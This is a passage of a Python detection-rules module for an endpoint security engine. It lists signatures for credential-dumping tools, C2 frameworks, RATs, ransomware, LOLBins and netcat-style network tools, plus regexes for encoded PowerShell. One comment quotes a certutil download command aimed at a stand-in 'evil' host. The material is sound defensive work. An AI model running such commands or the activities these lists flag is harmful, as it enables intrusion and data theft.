import re
from dataclasses import dataclass, field
from typing import Optional
from app.api.schemas.common import EventSchema

@dataclass
class RuleResult:
    triggered: bool
    severity: str = "LOW"
    description: str = ""
    mitre_tactic_id: Optional[str] = None
    mitre_tactic: Optional[str] = None
    mitre_technique_id: Optional[str] = None
    mitre_technique: Optional[str] = None
    # M4 Fase 5: identità e confidenza SEPARATA dalla severity.
    rule_id: str = "custom"
    version: str = "1.0"
    confidence: str = "medium"

@dataclass
class StaticRule:
    name: str
    severity: str
    description: str
    mitre_tactic: str
    mitre_technique: str
    mitre_technique_id: str
    fn: callable
    mitre_tactic_id: Optional[str] = None
    # M4 Fase 5: identificatore stabile + versione + confidenza.
    rule_id: str = ""
    version: str = "1.0"
    confidence: str = "medium"
    # Fase 5: eccezioni e allowlist documentate per ogni detection (spiegabilità SOC).
    exceptions: tuple = ()
    allowlist: tuple = ()

# ═══════════════════════════════════════════════════════════════════
#  EXPANDED THREAT SIGNATURES (200+ entries across categories)
# ═══════════════════════════════════════════════════════════════════

# — Credential dumping / password recovery
CREDENTIAL_TOOLS = {
    "mimikatz.exe", "mimikatz", "wce.exe", "fgdump.exe", "pwdump.exe",
    "gsecdump.exe", "lsadump.exe", "procdump.exe", "samdump2",
    "cachedump.exe", "creddump", "creddump7", "creddump8",
    "quarkspwdump.exe", "pwddump", "pwdump7.exe", "pwdump8.exe",
    "dcdiag.exe", "ntdsutil.exe", "vssadmin.exe", "dsamain.exe",
    "secretsdump.py", "impacket-secretsdump", "lsassy",
    "spraykatz", "kerbrute", "kerberoast", "asreproast",
    "ruby_smb", "crackmapexec", "netripper", "katz.exe",
    "lazagne.exe", "lazagne", "browserpass", "webpass",
    "mailpassview", "networkpassview", "chromepass", "iepassview",
    "protectedstorage", "dpapi", "sharpdpapi", "donpapi",
}

# — Network reconnaissance / scanning
SCANNER_TOOLS = {
    "nmap", "nmap.exe", "masscan", "masscan.exe", "zmap", "zmap.exe",
    "rustscan", "naabu", "naabu.exe", "unicornscan",
    "angryip", "advanced_port_scanner", "netscan",
    "zenmap", "p0f", "amass", "subfinder", "httpx",
    "gobuster", "dirb", "wfuzz", "ffuf", "dirbuster",
}

# — Exploitation / C2 frameworks
EXPLOIT_TOOLS = {
    "msfconsole", "msf", "msfvenom", "metasploit", "msfcli",
    "cobalt_strike", "beacon.exe", "cs_beacon", "teamserver",
    "meterpreter", "shellcode", "payload.exe",
    "sliver", "sliver-server", "sliver-client",
    "havoc", "havoc_c2", "mythic", "apfell", "poseidon",
    "bruteratel", "brute_ratel", "covenant", "grunt",
    "empire", "powershellempire", "starkiller",
    "pwn", "pwntools", "exploit.exe", "shellter",
    "veil", "veil-evasion", "shellter.exe",
    "encoder.exe", "av_evasion", "pe_to_shellcode",
    "donut", "donut.exe", "scrobj", "sctobjs",
}

# — Post-exploitation / lateral movement
POST_EXPLOIT_TOOLS = {
    "psexec.exe", "psexec64.exe", "psexecsvc.exe",
    "wmiexec", "wmiexec.exe", "wmic.exe", "wmic",
    "smbexec", "smbexec.py", "smbexec.exe",
    "atexec", "atexec.py", "atexec.exe",
    "dcomexec", "dcomexec.py",
    "impacket", "impacket.exe", "impacket_smb",
    "remcom", "pth-winexe", "winexe",
    "evil-winrm", "evil_winrm", "winrm.vbs",
    "xfreerdp", "freerdp", "remmina",
    "putty.exe", "plink.exe", "ssh.exe",
    "mstsc.exe", "mstsc",
}

# — Living-off-the-land binaries (LOLBins)
LOLBINS = {
    "rundll32.exe", "regsvr32.exe", "mshta.exe",
    "certutil.exe", "bitsadmin.exe", "cscript.exe", "wscript.exe",
    "powershell.exe", "powershell", "pwsh.exe", "pwsh",
    "cmd.exe", "sh", "bash", "zsh",
    "wmic.exe", "mmc.exe", "msiexec.exe",
    "reg.exe", "schtasks.exe", "sc.exe",
    "net.exe", "net1.exe", "nslookup.exe",
    "arp.exe", "route.exe", "tracert.exe",
    "findstr.exe", "xcopy.exe", "robocopy.exe",
    "curl.exe", "curl", "wget", "wget.exe",
    "certreq.exe", "esentutl.exe", "expand.exe",
    "extract.exe", "makecab.exe", "pcalua.exe",
    "replace.exe", "syncappvpublishingserver.exe",
    "wevtutil.exe", "bcdedit.exe", "fsutil.exe",
}

# — Remote Access Trojans / Beacons
RAT_TOOLS = {
    "njrat", "njrat.exe", "bladabindi", "nanocore",
    "asyncrat", "asyncrat.exe", "darkrat", "darkcomet",
    "quasar", "quasarrat", "quasar.exe",
    "xhacker", "xhackerrat", "orcus", "orcusrat",
    "venomrat", "cybergater", "adwind", "jrat",
    "limewire", "blackshades", "poisonivy", "hvnc",
    "vnc", "tightvnc", "ultravnc", "realvnc",
    "teamviewer", "anydesk", "ammyy", "logmein",
    "screenconnect", "supremo", "remoteutilities",
    "beacon", "beacon.exe", "trojan", "backdoor",
    "agenttesla", "formbook", "lokibot", "azorult",
    "vidar", "raccoon", "raccoonstealer",
}

# — Ransomware families
RANSOMWARE = {
    "wannacry", "wanacry", "wana_decryptor",
    "badrabbit", "locky", "locker", "goldeneye",
    "notpetya", "petya", "mischa",
    "ryuk", "conti", "conti.exe", "revil", "sodinokibi",
    "darkside", "blackmatter", "hellokitty",
    "dearcry", "blackbasta", "royal", "play",
    "cryptolocker", "cryptowall", "cerber",
    "teslacrypt", "torrentlocker", "keRanger",
    "sam", "samas", "cryptXXX", "pcrypt",
    "jigsaw", "mole", "dmexe", "blc.exe",
    "encrypt.exe", "encryptor", "decrypt",
    "lockbit", "lockbit.exe",
}

# — Keyloggers / information stealers
INFO_STEALERS = {
    "keylog", "keylogger", "keylogger.exe",
    "refog", "actualkeylogger", "bestfreakeylogger",
    "pykeylog", "logkeys", "uberkey",
    "spyrix", "microkeylogger", "kidlogger",
    "revealer", "keystroke", "keystrokelogger",
    "clipboard", "clipboardlogger", "clipper",
    "screenshot", "screencapture", "screenlogger",
    "formgrabber", "formstealer", "webinject",
    "redline", "redlinestealer",
}

# — Defense evasion / AV bypass
EVASION_TOOLS = {
    "processhacker", "processhacker.exe", 
    "procexp", "procexp.exe", "procmon.exe",
    "pchunter", "pchunter.exe", "powertool",
    "gmerexe", "gmerexe.exe", "rootkitrevealer",
    "hijackthis", "autoruns", "autoruns.exe",
    "tcpview", "tcpview.exe", "dbgview.exe",
    "x64dbg", "x32dbg", "ollydbg", "windbg",
    "ida", "idapro", "ghidra", "radare2", "rizin",
    "cheatengine", "cheatengine.exe",
    "scylla", "scylla.exe", "strongod",
    "protect", "protect.exe", "vmp", "vmprotect",
    "themida", "enigma", "asprotect", "upx",
    "packer", "packed", "crypted",
}

# — Script interpreters and LOL scripting
SCRIPT_INTERPRETERS = {
    "powershell.exe", "powershell", "pwsh.exe", "pwsh",
    "cmd.exe", "cmd", "wscript.exe", "cscript.exe",
    "mshta.exe", "rundll32.exe",
    "bash", "sh", "zsh", "dash", "ksh", "tcsh",
    "python", "python.exe", "python3", "python3.exe",
    "perl", "perl.exe", "ruby", "ruby.exe",
    "php", "php.exe", "php-cgi.exe",
    "node", "node.exe", "nodejs", "nodejs.exe",
    "javaw", "javaw.exe", "java.exe", "java",
    "lua", "lua.exe", "tclsh", "autoit3.exe",
    "powershell_ise.exe", "powershell_ise",
}

# — Suspicious execution paths (expanded; audit: normalizzati a slash "/"
# perche' i sensori possono inviare "C:/Temp/x.exe"; niente wildcard "*"
# letterali e niente "~" non espanso: match per sottostringa semplice)
SUSPICIOUS_PATHS = {
    "/temp/", "/tmp/", "/appdata/local/temp/",
    "/downloads/", "/desktop/", "/cache/",
    "/recycle.bin/", "/$recycle.bin/",
    "/programdata/", "/appdata/roaming/",
    "/users/public/", "/perflogs/",
    "/windows/temp/",
    "/system32/tasks/", "/system32/spool/drivers/",
    "/system32/spool/servic/",
    "/var/tmp/", "/dev/shm/",  # nosec B108 - detection indicator, not a filesystem operation
    "/var/cache/", "/var/spool/", "/var/www/",
    "/.cache/", "/.local/share/trash/",
    "/run/user/", "/dev/pts/",
    "library/launchagents/", "library/launchdaemons/",
}

# — Desktop apps that shouldn't run as root/system
NON_ROOT_PROCESSES = {
    "chrome.exe", "firefox.exe", "notepad.exe", "calc.exe",
    "wordpad.exe", "mspaint.exe", "winword.exe", "excel.exe",
    "powerpnt.exe", "outlook.exe", "acrord32.exe", "acrord64.exe",
    "iexplore.exe", "msedge.exe", "opera.exe", "brave.exe",
    "spotify.exe", "discord.exe", "slack.exe", "teams.exe",
    "zoom.exe", "skype.exe", "thunderbird.exe",
}

# — Network tools (expanded)
NETWORK_TOOLS = {
    "wireshark.exe", "wireshark", "tshark", "tcpdump",
    "dumpcap", "ethereal",
    "netstat", "arp.exe", "arp", "route.exe",
    "curl.exe", "curl", "wget", "wget.exe",
    "nc.exe", "ncat.exe", "ncat", "netcat", "socat",
    "telnet.exe", "telnet", "ftp.exe", "ftp",
    "ssh.exe", "ssh", "sshd", "sshd.exe",
    "nslookup.exe", "nslookup", "dig", "host",
    "ping.exe", "ping", "tracert.exe", "tracert",
    "pathping.exe", "mtr", "iperf", "iperf3",
    "httpie", "http", "aria2c", "aria2",
    "nmap", "nmap.exe", "masscan", "zmap",
    "rustscan", "naabu",
}

# — Anomalous parent-child process pairs
# Format: (parent_name_substring, child_name_substring, severity, description, mitre)
SUSPICIOUS_PARENT_CHILD = [
    (("winword.exe", "word.exe", "excel.exe", "powerpnt.exe", "outlook.exe"),
     ("powershell", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe",
      "rundll32.exe", "sh", "bash", "python", "wmic.exe", "regsvr32.exe",
      "certutil.exe", "bitsadmin.exe"),
     "CRITICAL", "Office process spawning script interpreter: '{parent}' -> '{child}'.",
     "TA0002", "Execution", "User Execution", "T1204"),

    (("chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe",
      "iexplore.exe", "safari.exe", "safari"),
     ("powershell", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe",
      "sh", "bash", "python", "rundll32.exe"),
     "HIGH", "Browser spawning script interpreter: '{parent}' -> '{child}'.",
     "TA0002", "Execution", "User Execution", "T1204"),

    (("acrord32.exe", "acrord64.exe", "pdf", "reader", "foxit"),
     ("powershell", "cmd.exe", "wscript.exe", "mshta.exe",
      "sh", "bash", "python"),
     "CRITICAL", "PDF reader spawning script interpreter: '{parent}' -> '{child}'.",
     "TA0002", "Execution", "User Execution", "T1204"),

    (("outlook.exe", "thebat.exe", "thunderbird.exe", "mail"),
     ("powershell", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe",
      "sh", "bash"),
     "CRITICAL", "Email client spawning script interpreter: '{parent}' -> '{child}'.",
     "TA0002", "Execution", "User Execution", "T1204"),

    (("svchost.exe", "services.exe", "lsass.exe", "wininit.exe", "system",
      "winlogon.exe"),
     ("powershell", "cmd.exe", "wscript.exe", "cscript.exe",
      "sh", "bash", "python"),
     "CRITICAL", "System process spawning script interpreter: '{parent}' -> '{child}'.",
     "TA0004", "Privilege Escalation", "Process Injection", "T1055"),

    (("explorer.exe", "explorer"),
     ("powershell", "cmd.exe", "wscript.exe", "mshta.exe",
      "regsvr32.exe", "rundll32.exe", "certutil.exe"),
     "MEDIUM", "Explorer spawning LOLBin: '{parent}' -> '{child}'.",
     "TA0005", "Defense Evasion", "Signed Binary Proxy Execution", "T1218"),

    (("notepad.exe", "wordpad.exe", "mspaint.exe", "calc.exe"),
     ("powershell", "cmd.exe", "sh", "bash"),
     "HIGH", "Utility process spawning script interpreter: '{parent}' -> '{child}'.",
     "TA0002", "Execution", "User Execution", "T1204"),
]

# — Known malware families (name substring match)
MALWARE_FAMILIES = [
    # Backdoors / Trojans
    ("lockbit", "HIGH", "Possible LockBit ransomware detected: process name '{name}'.",
     "TA0040", "Impact", "T1486"),
    ("trojan", "HIGH", "Possible trojan detected: process name '{name}'.",
     "TA0002", "Execution", "T1204"),
    ("backdoor", "HIGH", "Possible backdoor detected: process name '{name}'.",
     "TA0002", "Execution", "T1204"),
    ("dropper", "HIGH", "Possible dropper detected: process name '{name}'.",
     "TA0005", "Defense Evasion", "T1204"),
    ("downloader", "HIGH", "Possible downloader detected: process name '{name}'.",
     "TA0011", "Command and Control", "T1105"),
    ("loader", "MEDIUM", "Possible loader detected: process name '{name}'.",
     "TA0005", "Defense Evasion", "T1218"),
    ("worm", "MEDIUM", "Possible worm detected: process name '{name}'.",
     "TA0008", "Lateral Movement", "T1210"),
    ("rootkit", "HIGH", "Possible rootkit detected: process name '{name}'.",
     "TA0005", "Defense Evasion", "T1014"),
    ("spyware", "MEDIUM", "Possible spyware detected: process name '{name}'.",
     "TA0009", "Collection", "T1056"),
    ("adware", "LOW", "Possible adware detected: process name '{name}'.",
     "TA0009", "Collection", "T1056"),
    ("ransom", "HIGH", "Possible ransomware detected: process name '{name}'.",
     "TA0040", "Impact", "T1486"),
    ("keylogger", "HIGH", "Keylogger detected: process name '{name}'.",
     "TA0009", "Collection", "T1056"),
    ("miner", "MEDIUM", "Possible cryptocurrency miner: process name '{name}'.",
     "TA0040", "Impact", "T1496"),
    ("coin", "MEDIUM", "Possible cryptocurrency mining process: process name '{name}'.",
     "TA0040", "Impact", "T1496"),
    (" inject", "HIGH", "Possible process injection indicator: process name '{name}'.",
     "TA0005", "Defense Evasion", "T1055"),
    ("injector", "HIGH", "Process injector detected: process name '{name}'.",
     "TA0005", "Defense Evasion", "T1055"),
    ("steal", "HIGH", "Possible information stealer: process name '{name}'.",
     "TA0009", "Collection", "T1056"),
    ("password", "MEDIUM", "Password-related process: process name '{name}'.",
     "TA0006", "Credential Access", "T1003"),
]

# — Persistence locations (for process_path matching; slash-normalized)
PERSISTENCE_PATHS = {
    "/startup/", "/start menu/programs/startup/",
    "/system32/tasks/", "/system32/drivers/etc/",
    "/windows/system32/tasks/",
    "/appdata/roaming/microsoft/windows/start menu/programs/startup/",
    "/etc/init.d/", "/etc/systemd/system/",
    "/etc/cron.d/", "/etc/cron.hourly/", "/etc/cron.daily/",
    "/library/launchagents/", "/library/launchdaemons/",
    "library/launchagents/",
}

# — Encoded command patterns (expanded; audit: soglia {12,} non {20,}:
# payload brevi reali ("-e SQBuAHYAbwBrAGEAAAA=") passavano inosservati)
ENCODED_PATTERNS = [
    r'-(enc|encodedcommand|e)\s+[A-Za-z0-9+/]{12,}={0,2}',
    r'base64.+decode',
    r'frombase64string',
    r'-e\s+[A-Za-z0-9+/]{12,}={0,2}',
    r'iex\s*\(',
    r'invoke-expression',
    r'-ec\s+',
    r'frombase64',
    r'char\(\d+\)',
    r'\\x[0-9a-f]{2}',
]

# — High thread count threshold (possible injection indicator)
HIGH_THREAD_COUNT_THRESHOLD = 200

# — LOLBin in standard path: scatta solo con argomenti di download/esecuzione.
# (audit: certutil.exe legittimo in System32 non deve alertare da solo, ma
# `certutil -urlcache -split -f http://evil/x` si'.)
LOLBIN_SUSPICIOUS_ARGS = (
    "-urlcache", "-split", "-f http", "http://", "https://",
    "frombase64", "frombase64string", "invoke-expression", "iex(",
    "-encodedcommand", "-enc ", "-e ", "-ec ", "downloadstring",
    "webclient", "/transfer", "bitsadmin",
)

# — Standard system locations (slash-normalized): un LOLBin o un nome
# simile-a-persistenza QUI da solo non basta per l'alert.
_STANDARD_SYSTEM_PATHS = (
    "/windows/system32/", "/windows/syswow64/", "/windows/",
    "/usr/bin/", "/bin/", "/sbin/", "/usr/sbin/",
    "/program files/", "/program files (x86)/",
)


def _norm_path(path: str | None) -> str:
    """Path normalizzato per il matching: backslash->slash + lowercase."""
    return (path or "").replace("\\", "/").lower()


def _in_standard_path(path: str | None) -> bool:
    return any(p in _norm_path(path) for p in _STANDARD_SYSTEM_PATHS)


def _lev(a: str, b: str) -> int:
    """Distanza di Levenshtein (stringhe corte: nomi processo)."""
    if a == b:
        return 0
    la, lb = len(a), len(b)
    if abs(la - lb) > 1:
        return 2
    prev = list(range(lb + 1))
    for i in range(1, la + 1):
        cur = [i] + [0] * lb
        for j in range(1, lb + 1):
            cur[j] = min(prev[j] + 1, cur[j - 1] + 1,
                         prev[j - 1] + (a[i - 1] != b[j - 1]))
        prev = cur
    return prev[lb]


# ═══════════════════════════════════════════════════════════════════
#  RULE FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def rule_known_attack_tool(event: EventSchema) -> RuleResult:
    if not event.process_name:
        return RuleResult(triggered=False)
    name = event.process_name.lower().strip()
    name_noexe = name.replace(".exe", "").replace(".com", "").replace(".dll", "")
    combined = CREDENTIAL_TOOLS | SCANNER_TOOLS | EXPLOIT_TOOLS | POST_EXPLOIT_TOOLS | RAT_TOOLS | RANSOMWARE | EVASION_TOOLS | INFO_STEALERS
    combined_stems = {_stem(x) for x in combined}
    # Audit: il rename aggirava il match sul solo process_name. Si matcha
    # anche sul basename del path (binario rinominato) e sui token della
    # command_line (tool invocato con altro nome).
    candidates = {_stem(name), _stem(_base(event.process_path or ""))}
    if name in combined or name_noexe in combined or candidates & combined_stems:
        return RuleResult(
            triggered=True, severity="CRITICAL",
            description=f"Known attack tool / malware detected: '{event.process_name}'.",
            mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="User Execution",
            mitre_technique_id="T1204"
        )
    if event.command_line:
        tokens = set(re.findall(r"[a-z0-9][a-z0-9_.\-]*", event.command_line.lower()))
        if tokens & {t.lower() for t in combined}:
            return RuleResult(
                triggered=True, severity="CRITICAL",
                description=f"Known attack tool invoked via command line: '{event.process_name}'.",
                mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="User Execution",
                mitre_technique_id="T1204"
            )
    return RuleResult(triggered=False)


def rule_suspicious_execution_path(event: EventSchema) -> RuleResult:
    if not event.process_path:
        return RuleResult(triggered=False)
    path_lower = _norm_path(event.process_path)
    for suspicious in SUSPICIOUS_PATHS:
        if suspicious in path_lower:
            return RuleResult(
                triggered=True, severity="HIGH",
                description=f"Process '{event.process_name}' executing from suspicious path: '{event.process_path}'.",
                mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="Command and Scripting Interpreter",
                mitre_technique_id="T1059"
            )
    return RuleResult(triggered=False)


def rule_script_interpreter_abuse(event: EventSchema) -> RuleResult:
    if not event.process_name:
        return RuleResult(triggered=False)
    name = event.process_name.lower().strip()
    if name in SCRIPT_INTERPRETERS:
        return RuleResult(
            triggered=True, severity="MEDIUM",
            description=f"Script interpreter '{event.process_name}' detected.",
            mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="Command and Scripting Interpreter",
            mitre_technique_id="T1059"
        )
    return RuleResult(triggered=False)


def rule_privilege_escalation(event: EventSchema) -> RuleResult:
    if not event.process_name:
        return RuleResult(triggered=False)
    name = event.process_name.lower().strip()
    user = (event.user or "").lower().strip()
    is_privileged = user in {"root", "system", "nt authority\\system", "administrator", "nt authority\\local service", "nt authority\\network service"}
    is_desktop_app = name in NON_ROOT_PROCESSES
    if is_privileged and is_desktop_app:
        return RuleResult(
            triggered=True, severity="HIGH",
            description=f"Privilege escalation indicator: '{event.process_name}' running as '{event.user}'.",
            mitre_tactic_id="TA0004", mitre_tactic="Privilege Escalation", mitre_technique="Access Token Manipulation",
            mitre_technique_id="T1134"
        )
    return RuleResult(triggered=False)


def rule_double_extension(event: EventSchema) -> RuleResult:
    if not event.process_name:
        return RuleResult(triggered=False)
    name = event.process_name.lower()
    if re.search(r'\.(pdf|doc|docx|xls|xlsx|jpg|png|txt|rtf|ppt|pptx)\.(exe|bat|ps1|vbs|js|com|scr|pif|jar|wsf|hta)$', name):
        return RuleResult(
            triggered=True, severity="HIGH",
            description=f"Double extension detected in '{event.process_name}'.",
            mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Masquerading",
            mitre_technique_id="T1036"
        )
    return RuleResult(triggered=False)


def rule_encoded_command(event: EventSchema) -> RuleResult:
    # Audit: il payload encoded vive in command_line, non in process_path.
    # Si cerca in entrambi (path per retro-compatibilita' con vecchi sensori).
    hay = ((event.command_line or "") + " " + (event.process_path or "")).lower()
    if not hay.strip():
        return RuleResult(triggered=False)
    for pattern in ENCODED_PATTERNS:
        if re.search(pattern, hay):
            return RuleResult(
                triggered=True, severity="HIGH",
                description=f"Encoded/obfuscated command detected in '{event.process_name}': possible payload.",
                mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Obfuscated Files or Information",
                mitre_technique_id="T1027"
            )
    return RuleResult(triggered=False)


def rule_network_tool(event: EventSchema) -> RuleResult:
    if not event.process_name:
        return RuleResult(triggered=False)
    # Audit: confronto sullo stem (senza estensione): "masscan.exe" deve
    # matchare come "masscan", altrimenti la regola perde meta' dei casi.
    name = _stem(event.process_name.lower().strip())
    if name not in {_stem(t) for t in NETWORK_TOOLS}:
        return RuleResult(triggered=False)
    if event.process_path:
        path_lower = _norm_path(event.process_path)
        for suspicious in SUSPICIOUS_PATHS:
            if suspicious in path_lower:
                return RuleResult(
                    triggered=True, severity="MEDIUM",
                    description=f"Network tool '{event.process_name}' from suspicious path: '{event.process_path}'.",
                    mitre_tactic_id="TA0007", mitre_tactic="Discovery", mitre_technique="System Network Configuration Discovery",
                    mitre_technique_id="T1016"
                )
    return RuleResult(triggered=False)


def _stem(name: str) -> str:
    """Basename senza estensione: 'powershell.exe' == 'powershell'."""
    b = _base(name)
    for ext in (".exe", ".com", ".dll", ".bat", ".ps1", ".scr"):
        if b.endswith(ext):
            b = b[: -len(ext)]
            break
    return b


def _proc_match(name: str, pattern: str) -> bool:
    return _stem(name) == _stem(pattern)


def rule_suspicious_parent_child(event: EventSchema) -> RuleResult:
    if not event.parent_process_name or not event.process_name:
        return RuleResult(triggered=False)
    # Stem matching: "C:\...\winword.exe" matcha "winword", ma
    # "mywordviewer" non matcha più "word" (era FP col vecchio `in`).
    parent = event.parent_process_name
    child = event.process_name

    for parents, children, sev, desc, ta_tactic, tactic, technique, tech_id in SUSPICIOUS_PARENT_CHILD:
        if any(_proc_match(parent, p) for p in parents):
            if any(_proc_match(child, c) for c in children):
                return RuleResult(
                    triggered=True, severity=sev,
                    description=desc.format(parent=event.parent_process_name, child=event.process_name),
                    mitre_tactic_id=ta_tactic, mitre_tactic=tactic,
                    mitre_technique=technique, mitre_technique_id=tech_id,
                )
    return RuleResult(triggered=False)


def rule_malware_family(event: EventSchema) -> RuleResult:
    if not event.process_name:
        return RuleResult(triggered=False)
    name = event.process_name.lower().strip()
    name_stripped = name.replace(".exe", "").replace(".dll", "").replace(".bat", "").replace(".ps1", "")

    for keyword, sev, desc, ta_tactic, tech, tech_id in MALWARE_FAMILIES:
        # Audit: match solo a inizio token (niente FP tipo uploader/loader,
        # bitcoin/coin, examiner/miner). " inject" -> "inject" (spazio morto).
        # Audit MITRE: tactic_id = codice invariato (niente "Tactic 0002").
        kw = keyword.strip()
        if re.search(r"(?<![a-z0-9])" + re.escape(kw), name) or \
           re.search(r"(?<![a-z0-9])" + re.escape(kw), name_stripped):
            # La tupla e' (keyword, sev, desc, tactic_id, tactic_name, technique_id).
            return RuleResult(
                triggered=True, severity=sev,
                description=desc.format(name=event.process_name),
                mitre_tactic_id=ta_tactic, mitre_tactic=tech,
                mitre_technique_id=tech_id,
            )
    return RuleResult(triggered=False)


def rule_persistence_path(event: EventSchema) -> RuleResult:
    if not event.process_path:
        return RuleResult(triggered=False)
    path_lower = _norm_path(event.process_path)
    for p_path in PERSISTENCE_PATHS:
        if p_path in path_lower:
            return RuleResult(
                triggered=True, severity="HIGH",
                description=f"Process '{event.process_name}' installed persistence at: '{event.process_path}'.",
                mitre_tactic_id="TA0003", mitre_tactic="Persistence", mitre_technique="Boot or Logon Autostart Execution",
                mitre_technique_id="T1547"
            )
    return RuleResult(triggered=False)


def _family_match(name: str) -> bool:
    """True se il nome contiene una keyword malware a inizio token
    (stessa semantica di rule_malware_family, riusabile)."""
    for keyword, *_ in MALWARE_FAMILIES:
        kw = keyword.strip()
        if re.search(r"(?<![a-z0-9])" + re.escape(kw), name):
            return True
    return False


def rule_dll_hijack_path(event: EventSchema) -> RuleResult:
    def _susp_dll(path: str | None) -> bool:
        pl = _norm_path(path)
        return pl.endswith(".dll") and any(s in pl for s in SUSPICIOUS_PATHS)

    # Via primaria (audit): moduli caricati dal sensore.
    for mod in event.loaded_modules or []:
        if _susp_dll(mod):
            return RuleResult(
                triggered=True, severity="HIGH",
                description=f"Possible DLL hijacking: '{mod}' loaded from suspicious path.",
                mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="DLL Side-Loading",
                mitre_technique_id="T1574"
            )
    # Via legacy: processo .dll in esecuzione da path sospetto.
    if event.process_path and _susp_dll(event.process_path):
        return RuleResult(
            triggered=True, severity="HIGH",
            description=f"Possible DLL hijacking: '{event.process_name}' loaded from suspicious path.",
            mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="DLL Side-Loading",
            mitre_technique_id="T1574"
        )
    return RuleResult(triggered=False)


def rule_lolbin_usage(event: EventSchema) -> RuleResult:
    if not event.process_name:
        return RuleResult(triggered=False)
    name = event.process_name.lower().strip()
    if name not in LOLBINS or not event.process_path:
        return RuleResult(triggered=False)
    path_lower = _norm_path(event.process_path)
    # Standard: dir di sistema Windows ovunque nel path; dir Unix solo a radice
    # ("mingw64/bin" o "/home/x/bin" NON sono standard: devono alertare).
    is_standard = (
        "/system32/" in path_lower or "/syswow64/" in path_lower
        or path_lower.startswith(("/usr/bin/", "/bin/", "/sbin/", "/usr/sbin/"))
    )
    # LOLBin in non-standard path
    if not is_standard:
        return RuleResult(
            triggered=True, severity="HIGH",
            description=f"LOLBin '{event.process_name}' executed from non-standard path: '{event.process_path}'.",
            mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Signed Binary Proxy Execution",
            mitre_technique_id="T1218"
        )
    # Audit: LOLBin in path standard MA con argomenti di download/esecuzione:
    # il caso classico (certutil -urlcache -f http://...) non deve passare.
    cmd = (event.command_line or "").lower()
    if any(a in cmd for a in LOLBIN_SUSPICIOUS_ARGS):
        return RuleResult(
            triggered=True, severity="HIGH",
            description=f"LOLBin '{event.process_name}' with suspicious arguments: '{event.command_line}'.",
            mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Signed Binary Proxy Execution",
            mitre_technique_id="T1218"
        )
    return RuleResult(triggered=False)


def rule_high_thread_count(event: EventSchema) -> RuleResult:
    if event.thread_count is not None and event.thread_count > HIGH_THREAD_COUNT_THRESHOLD:
        return RuleResult(
            triggered=True, severity="MEDIUM",
            description=f"Process '{event.process_name}' has abnormally high thread count: {event.thread_count}. Possible injection.",
            mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Process Injection",
            mitre_technique_id="T1055"
        )
    return RuleResult(triggered=False)


def _base(name: str) -> str:
    """Basename minuscolo: evita match su path ('C:\\Tools\\x' -> 'x')."""
    n = (name or "").lower().strip().replace("\\", "/")
    return n.rsplit("/", 1)[-1]


def rule_network_beacon(event: EventSchema) -> RuleResult:
    """
    Outbound verso IP pubblici: da SOLO non basta (browser, updater = FP).
    Scatta solo se il processo è anche ad alto rischio (attack tool, LOLBin,
    malware family) o in path sospetto. L'analisi di periodicità vera resta
    nel correlation_engine (variance su 5+ campioni).
    """
    if not event.network_connections:
        return RuleResult(triggered=False)
    name = _base(event.process_name or "")
    # Audit: confronto su stem (i set mescolano "anydesk" e "nmap.exe":
    # "anydesk.exe" non matchava mai). Set completi (mancavano RAT/ransomware).
    stem = _stem(name)
    high_risk = (
        name in LOLBINS or stem in {_stem(t) for t in LOLBINS}
        or stem in {_stem(t) for t in CREDENTIAL_TOOLS}
        or stem in {_stem(t) for t in SCANNER_TOOLS}
        or stem in {_stem(t) for t in EXPLOIT_TOOLS}
        or stem in {_stem(t) for t in POST_EXPLOIT_TOOLS}
        or stem in {_stem(t) for t in RAT_TOOLS}
        or stem in {_stem(t) for t in RANSOMWARE}
        or stem in {_stem(t) for t in INFO_STEALERS}
        or stem in {_stem(t) for t in EVASION_TOOLS}
        or _family_match(stem)
    )
    if not high_risk:
        if not event.process_path:
            return RuleResult(triggered=False)
        pl = _norm_path(event.process_path)
        if not any(s in pl for s in SUSPICIOUS_PATHS):
            return RuleResult(triggered=False)
    outbound = []
    for conn in event.network_connections:
        remote = (conn.get("remote", "") or "").strip().strip("[]")
        state = (conn.get("state", "") or "").upper()
        if ":" not in remote or state != "ESTABLISHED":
            continue
        host, port = remote.rsplit(":", 1)
        host = host.strip().strip("[]")
        # Check for public IP (not private ranges)
        if host and not _is_private_ip(host):
            outbound.append(remote)
    if outbound:
        remote_str = "; ".join(outbound[:3])
        return RuleResult(
            triggered=True, severity="MEDIUM",
            description=f"High-risk process '{event.process_name}' has {len(outbound)} outbound connections: {remote_str}.",
            mitre_tactic_id="TA0011", mitre_tactic="Command and Control", mitre_technique="Application Layer Protocol",
            mitre_technique_id="T1071"
        )
    return RuleResult(triggered=False)


def rule_persistence_autorun(event: EventSchema) -> RuleResult:
    """Detect processes named like common persistence mechanisms."""
    if not event.process_name:
        return RuleResult(triggered=False)
    name = event.process_name.lower().strip()
    persistence_names = {
        "svch0st.exe", "scvhost.exe",
        "sysupdate.exe", "winupdate.exe", "microsofupdate.exe",
        "googledeupdate.exe", "adobeflashupdate.exe", "javupdate.exe",
        "mssecsvc.exe", "mssecsvc",
    }
    if name in persistence_names:
        return RuleResult(
            triggered=True, severity="HIGH",
            description=f"Suspicious persistence-like process name: '{event.process_name}'.",
            mitre_tactic_id="TA0003", mitre_tactic="Persistence", mitre_technique="Boot or Logon Autostart Execution",
            mitre_technique_id="T1547"
        )
    # Audit: varianti a 1 carattere (svch0sts.exe) aggiravano il set esatto.
    # Scatta solo fuori dai path di sistema: il vero svchost.exe di System32
    # (distanza 1 da svch0st) non deve mai alertare.
    #
